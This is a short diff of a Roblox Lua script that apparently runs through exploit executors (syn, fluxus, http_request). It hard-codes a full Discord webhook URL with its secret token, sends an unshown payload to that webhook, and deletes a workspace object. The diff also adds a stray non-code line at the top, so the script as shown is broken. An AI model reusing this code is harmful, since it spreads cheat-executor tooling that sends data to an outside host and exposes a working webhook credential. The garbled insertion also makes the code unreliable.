@@ -1,4 +1,4 @@
-
+khoahubroi
 HttpService = game:GetService("HttpService") 
  Webhook_URL =  "https://discord.com/api/webhooks/1165548495424462928/M5Qru9Sza9QK75S2Ssj9xbF8o5do9Ski-BtKXw2R51Yn6iOS6LgrDcm0TndFDcorCN2P" 
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
@@ -49,7 +49,6 @@ httprequest(
  }} 
  }) 
  })
-
 local test1 = game:GetService("Workspace"):FindFirstChild("treebien")
 if test1 then
 test1:Destroy()
